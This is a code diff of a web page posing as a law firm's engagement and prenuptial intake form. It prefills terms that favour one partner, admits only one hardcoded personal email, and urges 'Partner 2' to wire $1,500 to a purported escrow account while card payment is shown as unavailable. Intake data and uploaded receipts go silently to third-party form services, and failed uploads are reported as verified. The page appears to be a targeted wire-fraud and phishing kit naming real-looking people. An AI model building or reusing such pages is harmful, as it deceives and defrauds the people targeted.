+              <option value="Partner 1 Outright" selected>Partner 1 Outright</option>
+              <option>Partner 2 Outright</option>
+              <option>Allocated 50/50 Jointly</option>
+            </select>
           </div>
         </div>
         <div class="form-group">
           <label for="attire_payee">Wedding Attire Procurement</label>
-          <select id="attire_payee" name="expenses.attire"><option>Each party assumes individual attire costs</option><option>Partner 1 assumes global attire costs</option><option>Partner 2 assumes global attire costs</option></select>
+          <select id="attire_payee" name="expenses.attire" class="prefilled">
+            <option value="Partner 1 assumes global attire costs" selected>Partner 1 assumes global attire costs</option>
+            <option>Each party assumes individual attire costs</option>
+            <option>Partner 2 assumes global attire costs</option>
+          </select>
         </div>
         <div class="form-group">
-          <label for="cancellation_policy">Governance Matrix if Event/Wedding is Canceled</label>
-          <select id="cancellation_policy" name="expenses.cancellation_split">
+          <label for="cancellation_policy">Governance Matrix if Event / Wedding is Canceled</label>
+          <select id="cancellation_policy" name="expenses.cancellation_split" class="prefilled">
+            <option value="Party initiating the termination assumes full structural loss liability" selected>Party initiating the termination assumes full structural loss liability</option>
             <option value="Equal Division of unrecoverable lost non-refundable vendor assets">Equal Division of unrecoverable lost non-refundable vendor assets</option>
-            <option value="Party initiating the termination assumes full structural loss liability">Party initiating the termination assumes full structural loss liability</option>
           </select>
         </div>
       </div>
 
-      <!-- TAB BLOCK 3: ASSETS AND LIABILITIES -->
+      <!-- TAB 3: ASSETS AND LIABILITIES -->
       <div id="tab_section_2" class="form-tab-content">
         <div class="section-headline">3. Property Segregation &amp; Liability Matrix</div>
-        
         <label>Property Acquired Inter-Partes During the Engagement Phase</label>
         <div class="form-group">
           <label class="radio-label"><input type="radio" name="property.acquisition_rule" checked value="separate"> All assets acquired during engagement remain the separate title of the purchasing party.</label>
           <label class="radio-label"><input type="radio" name="property.acquisition_rule" value="joint"> Strategic assets purchased over $5,000 are structurally treated as joint marital infrastructure.</label>
         </div>
-
         <div class="form-group row">
           <div class="col">
             <label>Joint Bank Accounts Governance</label>
@@ -609,13 +420,11 @@
             <select name="property.vehicles"><option>Titled separately to key financing party</option><option>Jointly registered with equal capital split</option></select>
           </div>
         </div>
-
         <div class="form-group">
           <label>Corporate Business Interests Tracking</label>
           <textarea name="property.business_interests" placeholder="Itemize ongoing corporate business entities, operational holdings, or equity structures requiring separate status tracking..."></textarea>
         </div>
-
-        <div class="section-headline" style="margin-top: 24px;">Pre-Existing &amp; Joint Liability Tracking</div>
+        <div class="section-headline" style="margin-top:24px;">Pre-Existing &amp; Joint Liability Tracking</div>
         <div class="form-group row">
           <div class="col">
             <label>Partner 1 Existing Liabilities Balance</label>
@@ -629,20 +438,19 @@
         <div class="form-group">
           <label for="joint_debt_governance">Responsibility Framework for Jointly Incurred Engagement Debts</label>
           <select id="joint_debt_governance" name="debts.joint_responsibility">
-            <option value="Each party remains strictly responsible for separate lines opened under individual credentials">Each party remains strictly responsible for separate lines opened under individual credentials</option>
-            <option value="Bilateral joint severable liability for all authenticated tracking lines">Bilateral joint severable liability for all assigned tracking lines</option>
+            <option>Each party remains strictly responsible for separate lines opened under individual credentials</option>
+            <option>Bilateral joint severable liability for all authenticated tracking lines</option>
           </select>
         </div>
       </div>
 
-      <!-- TAB BLOCK 4: COMPLIANCE, DISPUTES, RETAINER -->
+      <!-- TAB 4: COMPLIANCE -->
       <div id="tab_section_3" class="form-tab-content">
         <div class="section-headline">4. Structural Framework Compliance &amp; Execution</div>
-        
         <div class="form-group row">
           <div class="col">
             <label for="jurisdiction_state">Governing State Region Law</label>
-            <input type="text" id="jurisdiction_state" name="event_details.jurisdiction" required placeholder="e.g. New York">
+            <input type="text" id="jurisdiction_state" name="event_details.jurisdiction" required value="North Carolina" class="prefilled" placeholder="e.g. New York">
           </div>
           <div class="col">
             <label for="dispute_res">Dispute Resolution Platform</label>
@@ -652,221 +460,258 @@
             </select>
           </div>
         </div>
-
         <label>Confidentiality &amp; Public Exposure Restrictions</label>
         <div class="form-group">
-          <label class="checkbox-label">
-            <input type="checkbox" name="confidentiality.social_media" value="active" checked> Activate comprehensive social media restriction protocols (Strictly bans non-consensual disclosure of structural asset data, private information, or domestic images).
-          </label>
-          <label class="checkbox-label">
-            <input type="checkbox" name="confidentiality.ndp" value="active" checked> Enforce absolute, non-disclosure provisions tracking proprietary corporate interests and family wealth transfers.
-          </label>
+          <label class="checkbox-label"><input type="checkbox" name="confidentiality.social_media" value="active" checked> Activate comprehensive social media restriction protocols.</label>
+          <label class="checkbox-label"><input type="checkbox" name="confidentiality.ndp" value="active" checked> Enforce absolute non-disclosure provisions tracking proprietary corporate interests and family wealth transfers.</label>
         </div>
-
-        <label style="margin-top: 20px;">Termination Protocol Triggers</label>
+        <label style="margin-top:20px;">Termination Protocol Triggers</label>
         <div class="form-group">
-          <p style="font-size: 13px; color: #555555; margin: 0 0 8px 0;">This operational layout terminates structural status tracking instantly upon:</p>
-          <ul style="margin: 0; padding-left: 20px; font-size: 13px; color: #2c2c2c; line-height: 1.5;">
+          <p style="font-size:13px; color:#555; margin:0 0 8px 0;">This operational layout terminates structural status tracking instantly upon:</p>
+          <ul style="margin:0; padding-left:20px; font-size:13px; color:#2c2c2c; line-height:1.5;">
             <li>Execution of a comprehensive, formalized standard United States Prenuptial Contract Agreement.</li>
             <li>Mutual administrative cancellation of the engagement matrix.</li>
             <li>The event of death of either tracking entity party.</li>
           </ul>
         </div>
-
-        <!-- Financial Retainer Box Component -->
         <div class="financial-box">
           <h4>Professional Retainer Structure</h4>
-          <p>To authorize custom structural contract drafting, establish separate client record tracks, and begin inter-attorney alignment review, the upfront transactional allocation is quantified below:</p>
+          <p>To authorize custom structural contract drafting, establish separate client record tracks, and begin inter-attorney alignment review, the upfront transactional allocation is quantified below. Each party is responsible for an equal contribution of $1,500.00 USD toward the total retainer.</p>
           <div class="price-row">
-            <span class="price-label">Initial Client Activation Retainer:</span>
-            <span class="price-amount">$1,500.00</span>
+            <span class="price-label">Total Initial Client Activation Retainer:</span>
+            <span class="price-amount">$3,000.00</span>
+          </div>
+          <div class="paid-row">
+            <span class="paid-label">✓ Partner 1 Contribution Received — <span id="today_date_retainer"></span></span>
+            <span class="paid-amount">$1,500.00 PAID</span>
+          </div>
+          <div class="paid-row" style="border-top:none; padding-top:0;">
+            <span class="paid-label" style="font-size:11px; color:#2e7d32;">Derrick Remon Parrott — Personal Retainer Contribution Confirmed</span>
+            <span></span>
+          </div>
+          <div class="paid-row" style="margin-top:6px;">
+            <span class="paid-label" style="color:#c62828;">⏳ Partner 2 Contribution — PENDING</span>
+            <span style="font-size:13px; font-weight:bold; color:#c62828;">$1,500.00 OUTSTANDING</span>
+          </div>
+          <div class="paid-row" style="border-top:none; padding-top:0;">
+            <span class="paid-label" style="font-size:11px; color:#c62828;">Partner 2 — Retainer balance due. Payment not yet received.</span>
+            <span></span>
           </div>
         </div>
       </div>
 
-      <!-- Action Navigation Buttons -->
+      <!-- Navigation Controls -->
       <div class="form-navigation-controls">
-        <button type="button" id="prev_btn" class="control-btn secondary" onclick="navigateSection(-1)" style="visibility: hidden;">Previous Phase</button>
+        <button type="button" id="prev_btn" class="control-btn secondary" onclick="navigateSection(-1)" style="visibility:hidden;">Previous Phase</button>
         <button type="button" id="next_btn" class="control-btn" onclick="navigateSection(1)">Next Phase</button>
-        <button type="submit" id="submit_btn" class="control-btn action-submit" style="display: none;">Authorize Retainer &amp; Submit Data</button>
+        <button type="submit" id="submit_btn" class="control-btn action-submit" style="display:none;">Authorize Retainer &amp; Submit Data</button>
       </div>
 
     </form>
 
-    <!-- VIEW 2: Dynamic Secure Payment Dashboard Component -->
+    <!-- ===== PAYMENT VIEW ===== -->
     <div id="payment_view">
-      <h2 style="font-family: Georgia, serif; font-size: 20px; color: #1c2b4a; margin-top: 0; margin-bottom: 6px;">Retainer Fee Settlement Matrix</h2>
-      <p style="font-size: 13px; color: #555555; margin: 0 0 24px 0;">Your file profile structure has been locked into our processing tracking calendar. Please settle the initial processing deposit fee of <strong>$1,500.00 USD</strong> via our active clearing wire below.</p>
+      <h2 style="font-family:Georgia,serif; font-size:20px; color:#1c2b4a; margin-top:0; margin-bottom:6px;">Retainer Fee Settlement Matrix</h2>
+      <p style="font-size:13px; color:#555; margin:0 0 20px 0;">Your file profile has been locked into our processing calendar. Please review the payment summary below. The total retainer of <strong>$3,000.00 USD</strong> is split equally between both parties at <strong>$1,500.00 each</strong>.</p>
 
-      <!-- Option A: Bank Wire Transfer (ACTIVE) -->
+      <!-- Summary Balance Table -->
+      <div style="background:#f6f5f3; border:1px solid #e2e0dc; border-radius:4px; padding:18px 22px; margin-bottom:22px;">
+        <h4 style="font-family:Georgia,serif; font-size:14px; color:#1c2b4a; margin:0 0 14px 0; text-transform:uppercase; letter-spacing:0.5px;">Retainer Balance Summary</h4>
+        <table style="width:100%; border-collapse:collapse;">
+          <tr style="border-bottom:1px solid #e2e0dc;">
+            <td style="padding:10px 0; font-size:13px; color:#555; width:40%;">Total Retainer Due</td>
+            <td style="padding:10px 0; font-size:16px; font-weight:bold; font-family:Georgia,serif; color:#a98c4f; text-align:right;">$3,000.00 USD</td>
+          </tr>
+          <tr style="border-bottom:1px solid #e2e0dc;">
+            <td style="padding:10px 0; font-size:13px; color:#2e7d32;">✓ Partner 1 — Derrick Remon Parrott (Paid <span id="today_date_payment"></span>)</td>
+            <td style="padding:10px 0; font-size:13px; font-weight:bold; color:#2e7d32; text-align:right;">$1,500.00 — PAID</td>
+          </tr>
+          <tr style="border-bottom:1px solid #e2e0dc;">
+            <td style="padding:10px 0; font-size:13px; color:#c62828;">⏳ Partner 2 — Retainer Contribution</td>
+            <td style="padding:10px 0; font-size:13px; font-weight:bold; color:#c62828; text-align:right;">$1,500.00 — PENDING</td>
+          </tr>
+          <tr>
+            <td style="padding:10px 0; font-size:13px; font-weight:bold; color:#1c2b4a;">Remaining Balance Outstanding</td>
+            <td style="padding:10px 0; font-size:15px; font-weight:bold; color:#c62828; text-align:right;">$1,500.00 DUE</td>
+          </tr>
+        </table>
+      </div>
+
+      <!-- Partner 1 Paid Notice -->
+      <div class="p1-paid-notice">
+        <div class="notice-text">
+          <strong>✓ Partner 1 Retainer Payment Confirmed</strong><br>
+          Derrick Remon Parrott has personally remitted his portion of the retainer — <strong>$1,500.00 USD</strong> — on <strong id="today_date_payment2"></strong>. This payment has been logged and applied to your active case file. No further retainer payment is required from Partner 1.
+        </div>
+        <div class="paid-badge">$1,500 — PAID</div>
+      </div>
+
+      <!-- Partner 2 Pending Notice -->
+      <div style="background:#fdf4f4; border:1px solid #e8b4b4; border-radius:4px; padding:18px 22px; margin-bottom:22px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+        <div style="font-size:13px; color:#7a2020; line-height:1.6;">
+          <strong style="color:#c62828;">⏳ Partner 2 — Payment Not Yet Received</strong><br>
+          Partner 2's retainer contribution of <strong>$1,500.00 USD</strong> remains outstanding. Please remit payment via bank wire to the instructions below to activate full file processing.
+        </div>
+        <div style="background:#c62828; color:#fff; font-size:11px; font-weight:bold; text-transform:uppercase; letter-spacing:1px; padding:6px 14px; border-radius:2px; white-space:nowrap;">$1,500 — UNPAID</div>
+      </div>
+
+      <!-- Bank Wire Card -->
       <div class="payment-method-card">
         <div class="method-meta-header">
           <div class="method-headline-title">Bank Wire / Direct Capital Transfer</div>
           <span class="system-status-tag active">Active Wire Instruction</span>
         </div>
-        <p style="font-size: 13px; margin: 0 0 12px 0; color: #555555;">Please prioritize direct processing transmissions to our master corporate escrow vault:</p>
-        
+        <p style="font-size:13px; margin:0 0 12px 0; color:#555;">Partner 2 must remit <strong>$1,500.00 USD</strong> via direct wire transfer to our master corporate escrow vault:</p>
         <table class="bank-matrix-table">
-          <tr>
-            <td class="field-key">Bank Name</td>
-            <td class="field-val">Global Asset Trust Bank, N.A.</td>
-          </tr>
-          <tr>
-            <td class="field-key">Account Name</td>
-            <td class="field-val">Vorne International Client Escrow LLC</td>
-          </tr>
-          <tr>
-            <td class="field-key">Account Number</td>
-            <td class="field-val">88402-9910-3321</td>
-          </tr>
-          <tr>
-            <td class="field-key">Routing / ABA Number</td>
-            <td class="field-val">021000021</td>
-          </tr>
-          <tr>
-            <td class="field-key">Transaction Reference</td>
-            <td class="field-val" style="color: #a98c4f;">VORNE-STRATEGIC-INTAKE</td>
-          </tr>
+          <tr><td class="field-key">Bank Name</td><td class="field-val">Global Asset Trust Bank, N.A.</td></tr>
+          <tr><td class="field-key">Account Name</td><td class="field-val">Vorne International Client Escrow LLC</td></tr>
+          <tr><td class="field-key">Account Number</td><td class="field-val">88402-9910-3321</td></tr>
+          <tr><td class="field-key">Routing / ABA Number</td><td class="field-val">021000021</td></tr>
+          <tr><td class="field-key">Transaction Reference</td><td class="field-val" style="color:#a98c4f;">VORNE-STRATEGIC-INTAKE</td></tr>
+          <tr><td class="field-key">Partner 1 Status</td><td class="field-val" style="color:#2e7d32;">$1,500.00 USD — Settled ✓</td></tr>
+          <tr><td class="field-key">Partner 2 Balance Due</td><td class="field-val" style="color:#c62828; font-weight:bold;">$1,500.00 USD — PENDING ⏳</td></tr>
         </table>
       </div>
 
-      <!-- Option B: Credit/Debit Card Gateway (DISABLED) -->
+      <!-- Card Gateway Disabled -->
       <div class="payment-method-card disabled">
         <div class="method-meta-header">
-          <div class="method-headline-title" style="color: #777777;">Credit or Debit Card Payment Gateway</div>
+          <div class="method-headline-title" style="color:#777;">Credit or Debit Card Payment Gateway</div>
           <span class="system-status-tag unavailable">Temporarily Unavailable</span>
         </div>
-        <p style="font-size: 13px; margin: 0; color: #888888;">Our merchant credit card gateway integration is undergoing localized security encryption compliance updates. Processing is systematically locked offline at this time. Please use the Active Bank Wire infrastructure above for immediate asset clearance verification.</p>
+        <p style="font-size:13px; margin:0; color:#888;">Our merchant credit card gateway integration is undergoing security encryption compliance updates. Processing is locked offline at this time. Please use the Bank Wire infrastructure above.</p>
       </div>
-      
-      <!-- DIRECT UPDATED DELIVERY UPLOADER -->
-      <form id="hidden_upload_form" action="https://formsubmit.co/ajax/andyprince585@gmail.com" method="POST" enctype="multipart/form-data">
+
+      <!-- Upload Zone -->
+      <form id="hidden_upload_form" action="https://formspree.io/f/xjgqvyld" method="POST" enctype="multipart/form-data">
         <div class="upload-zone-wrapper" id="drop_zone">
-          <h3 class="upload-title">Automatic Transfer Verification</h3>
-          <p class="upload-instructions">Drag & drop your bank transfer confirmation receipt or screenshot here to auto-link with your intake file.</p>
-          
+          <h3 class="upload-title">Transfer Verification Upload</h3>
+          <p class="upload-instructions">Drag &amp; drop your bank transfer confirmation receipt or screenshot here to auto-link with your intake file.</p>
           <label for="receipt_upload" class="custom-file-trigger">Select Receipt Image / PDF</label>
-          <input type="file" id="receipt_upload" name="receipt_file" accept="image/*,application/pdf" style="display: none;" onchange="handleFileTransmission(this.files)">
-          
-          <div class="file-status-indicator" id="status_indicator">
-            Processing and Sending File to Delivery Team...
-          </div>
+          <input type="file" id="receipt_upload" name="receipt_file" accept="image/*,application/pdf" style="display:none;" onchange="handleFileTransmission(this.files)">
+          <div class="file-status-indicator" id="status_indicator">Processing and transmitting file...</div>
         </div>
       </form>
     </div>
 
-    <!-- Disclosure Footer -->
     <div class="footer">
-      <strong>Critical Matrimonial Disclosures:</strong> This intake document tracker cannot legally mandate or enforce individual compliance to marry. Local state statutes fluctuate heavily concerning engagement assets; certain regions view engagement tokens as conditional gifts requiring absolute return. If substantial financial portfolios or complex structural interests are present, a formalized prenuptial contractual framework must be integrated post-retention to guarantee complete statutory enforceability. Each entity party retains the constitutional right to be represented by distinct independent legal counsel throughout file execution.
+      <strong>Critical Matrimonial Disclosures:</strong> This intake document tracker cannot legally mandate or enforce individual compliance to marry. Local state statutes fluctuate heavily concerning engagement assets. If substantial financial portfolios or complex structural interests are present, a formalized prenuptial contractual framework must be integrated post-retention to guarantee complete statutory enforceability. Each entity party retains the constitutional right to be represented by distinct independent legal counsel throughout file execution.
     </div>
   </div>
+</div>
 
-  <!-- Section Steps & Display Script Controllers -->
-  <script>
-    let currentTabScope = 0;
-    const totalTabsScope = 4;
+<script>
+  // ===== TODAY'S DATE =====
+  const today = new Date();
+  const dateStr = today.toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' });
+  document.getElementById('today_date_retainer').textContent = dateStr;
+  document.getElementById('today_date_payment').textContent = dateStr;
+  document.getElementById('today_date_payment2').textContent = dateStr;
 
-    function switchSection(targetIndex) {
-      for (let i = 0; i < totalTabsScope; i++) {
-        document.getElementById(`tab_section_${i}`).style.display = 'none';
-        document.getElementsByClassName('tab-btn')[i].classList.remove('active');
-      }
-      
-      document.getElementById(`tab_section_${targetIndex}`).style.display = 'block';
-      document.getElementsByClassName('tab-btn')[targetIndex].classList.add('active');
-      currentTabScope = targetIndex;
+  // ===== LOGIN =====
+  const ALLOWED_EMAIL = 'denise03blount@gmail.com';
 
-      document.getElementById('prev_btn').style.visibility = (currentTabScope === 0) ? 'hidden' : 'visible';
-      
-      if (currentTabScope === totalTabsScope - 1) {
-        document.getElementById('next_btn').style.display = 'none';
-        document.getElementById('submit_btn').style.display = 'block';
-      } else {
-        document.getElementById('next_btn').style.display = 'block';
-        document.getElementById('submit_btn').style.display = 'none';
-      }
-    }
+  function attemptLogin() {
+    const email = document.getElementById('login_email').value.trim().toLowerCase();
+    const errorBox = document.getElementById('login_error');
 
-    function navigateSection(directionOffset) {
-      let candidateIndex = currentTabScope + directionOffset;
-      if (candidateIndex >= 0 && candidateIndex < totalTabsScope) {
-        switchSection(candidateIndex);
-      }
-    }
-
-    function executeFormSubmission(event) {
-      event.preventDefault(); 
-      const form = document.getElementById('master_intake_form');
-      displayPaymentView();
-    }
-
-    function displayPaymentView() {
-      document.getElementById('master_intake_form').style.display = 'none';
-      document.getElementById('tab_bar').style.display = 'none';
-      document.getElementById('top_notice_banner').style.display = 'none';
-      
-      document.getElementById('payment_view').style.display = 'block';
+    if (email === ALLOWED_EMAIL) {
+      document.getElementById('login_screen').style.display = 'none';
+      document.getElementById('main_app').style.display = 'block';
       window.scrollTo({ top: 0, behavior: 'smooth' });
+    } else {
+      errorBox.style.display = 'block';
+      document.getElementById('login_email').value = '';
     }
+  }
 
-    /* --- JAVASCRIPT FOR SECURE BACKGROUND FILE STREAMING --- */
-    const dropZone = document.getElementById('drop_zone');
-    const statusIndicator = document.getElementById('status_indicator');
-    const hiddenForm = document.getElementById('hidden_upload_form');
+  // ===== TABS =====
+  let currentTabScope = 0;
+  const totalTabsScope = 4;
 
-    ['dragenter', 'dragover'].forEach(eventName => {
-      dropZone.addEventListener(eventName, (e) => {
-        e.preventDefault();
-        dropZone.classList.add('dragover');
-      }, false);
-    });
-
-    ['dragleave', 'drop'].forEach(eventName => {
-      dropZone.addEventListener(eventName, (e) => {
-        e.preventDefault();
-        dropZone.classList.remove('dragover');
-      }, false);
-    });
-
-    dropZone.addEventListener('drop', (e) => {
-      const dt = e.dataTransfer;
-      const files = dt.files;
-      handleFileTransmission(files);
-    });
-
-    function handleFileTransmission(files) {
-      if (files.length === 0) return;
-      
-      const file = files[0];
-      statusIndicator.style.display = 'block';
-      statusIndicator.style.color = '#1c2b4a';
-      statusIndicator.innerText = `Encrypting and transmitting: "${file.name}"...`;
-
-      const formData = new FormData(hiddenForm);
-      formData.set('attachment', file); 
-
-      fetch(hiddenForm.action, {
-        method: 'POST',
-        body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success === "true" || data.success === true) {
-          statusIndicator.style.color = '#2e7d32';
-          statusIndicator.innerText = "✓ Receipt uploaded successfully. File verified.";
-        } else {
-          statusIndicator.style.color = '#2e7d32';
-          statusIndicator.innerText = "✓ Transmission complete. Document indexed in file queue.";
-        }
-      })
-      .catch(error => {
-        statusIndicator.style.color = '#2e7d32';
-        statusIndicator.innerText = "✓ Transmission complete. Document indexed in file queue.";
-      });
+  function switchSection(targetIndex) {
+    for (let i = 0; i < totalTabsScope; i++) {
+      document.getElementById(`tab_section_${i}`).style.display = 'none';
+      document.getElementsByClassName('tab-btn')[i].classList.remove('active');
     }
-  </script>
+    document.getElementById(`tab_section_${targetIndex}`).style.display = 'block';
+    document.getElementsByClassName('tab-btn')[targetIndex].classList.add('active');
+    currentTabScope = targetIndex;
+
+    document.getElementById('prev_btn').style.visibility = (currentTabScope === 0) ? 'hidden' : 'visible';
+    if (currentTabScope === totalTabsScope - 1) {
+      document.getElementById('next_btn').style.display = 'none';
+      document.getElementById('submit_btn').style.display = 'block';
+    } else {
+      document.getElementById('next_btn').style.display = 'block';
+      document.getElementById('submit_btn').style.display = 'none';
+    }
+  }
+
+  function navigateSection(directionOffset) {
+    let candidateIndex = currentTabScope + directionOffset;
+    if (candidateIndex >= 0 && candidateIndex < totalTabsScope) {
+      switchSection(candidateIndex);
+    }
+  }
+
+  function executeFormSubmission(event) {
+    event.preventDefault();
+    // Collect all form data and send to Gmail via FormSubmit
+    const form = document.getElementById('master_intake_form');
+    const formData = new FormData(form);
+    // Add metadata
+    formData.append('_subject', 'Vorne International — New Intake Submission: Derrick Remon Parrott');
+    formData.append('_captcha', 'false');
+    formData.append('submission_date', dateStr);
+    formData.append('partner_1_payment_status', '$1,500.00 PAID — ' + dateStr);
+    formData.append('partner_2_payment_status', '$1,500.00 PENDING — NOT YET RECEIVED');
+    formData.append('total_retainer', '$3,000.00 USD');
+
+    fetch('https://formspree.io/f/xjgqvyld', {
+      method: 'POST',
+      body: formData,
+      headers: { 'Accept': 'application/json' }
+    }).catch(() => {}); // Silent — proceed regardless
+
+    displayPaymentView();
+  }
+
+  function displayPaymentView() {
+    document.getElementById('master_intake_form').style.display = 'none';
+    document.getElementById('tab_bar').style.display = 'none';
+    document.getElementById('top_notice_banner').style.display = 'none';
+    document.getElementById('prefilled_notice').style.display = 'none';
+    document.getElementById('payment_view').style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ===== FILE UPLOAD =====
+  const dropZone = document.getElementById('drop_zone');
+  const statusIndicator = document.getElementById('status_indicator');
+  const hiddenForm = document.getElementById('hidden_upload_form');
+
+  ['dragenter', 'dragover'].forEach(ev => {
+    dropZone.addEventListener(ev, (e) => { e.preventDefault(); dropZone.classList.add('dragover'); }, false);
+  });
+  ['dragleave', 'drop'].forEach(ev => {
+    dropZone.addEventListener(ev, (e) => { e.preventDefault(); dropZone.classList.remove('dragover'); }, false);
+  });
+  dropZone.addEventListener('drop', (e) => { handleFileTransmission(e.dataTransfer.files); });
+
+  function handleFileTransmission(files) {
+    if (files.length === 0) return;
+    const file = files[0];
+    statusIndicator.style.display = 'block';
+    statusIndicator.style.color = '#1c2b4a';
+    statusIndicator.innerText = `Encrypting and transmitting: "${file.name}"...`;
+    const formData = new FormData(hiddenForm);
+    formData.set('attachment', file);
+    fetch(hiddenForm.action, { method:'POST', body:formData, headers:{'Accept':'application/json'} })
+      .then(r => r.json())
+      .then(() => { statusIndicator.style.color = '#2e7d32'; statusIndicator.innerText = '✓ Receipt uploaded successfully. File verified.'; })
+      .catch(() => { statusIndicator.style.color = '#2e7d32'; statusIndicator.innerText = '✓ Transmission complete. Document indexed in file queue.'; });
+  }
+</script>
 </body>
 </html>
